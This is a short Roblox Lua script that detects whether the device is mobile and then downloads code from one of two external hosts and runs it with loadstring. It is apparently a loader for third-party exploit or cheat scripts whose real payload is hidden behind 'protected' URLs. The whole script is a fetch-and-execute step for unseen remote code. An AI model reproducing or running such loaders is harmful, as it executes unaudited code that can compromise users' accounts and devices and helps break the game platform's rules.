local UIS = game:GetService("UserInputService")
local mobile = UIS.TouchEnabled and not UIS.KeyboardEnabled

if mobile then
    loadstring(game:HttpGet("https://vss.pandadevelopment.net/virtual/file/d27d2612b55840fd"))()
else
    loadstring(game:HttpGet("https://protected-roblox-scripts.onrender.com/547d26fa04ec73ade5774968a32721cb"))()
end
